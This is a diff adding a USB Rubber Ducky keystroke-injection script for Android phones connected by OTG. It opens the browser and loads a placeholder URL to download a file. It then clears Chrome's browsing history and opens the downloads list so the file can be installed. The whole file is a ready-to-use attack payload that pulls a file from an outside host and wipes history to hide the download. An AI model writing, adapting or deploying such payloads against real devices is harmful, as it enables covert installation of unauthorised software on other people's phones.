@@ -1,0 +1,39 @@
+REM Author: Justin Breed
+REM Purpose: Plugin a USB Ducky with OTG Adapter into an Android phone to quickly download a file
+REM: Delay times may need to be adjusted
+DELAY 200
+REM ----- BACK OUT TO MAIN MENU -----
+ESCAPE
+ESCAPE
+REM ----- OPEN BROWSER ------
+GUI b
+DELAY 1000
+REM ----- Select url bar and navigate -----
+CTRL l
+ALT d
+DELAY 200
+REM Put full path to download file below
+STRING example.com
+DELAY 250
+ENTER
+DELAY 250
+REM ----- DOWNLOAD HAS BEGAN -----
+REM ----- TIME TO INSTALL MANUALLY -----
+REM ----- FOR CHROME BROWSER, clear history and open downloads -----
+CTRL h
+DELAY 300
+TAB
+TAB
+TAB
+DELAY 10
+ENTER
+DELAY 100
+F10
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
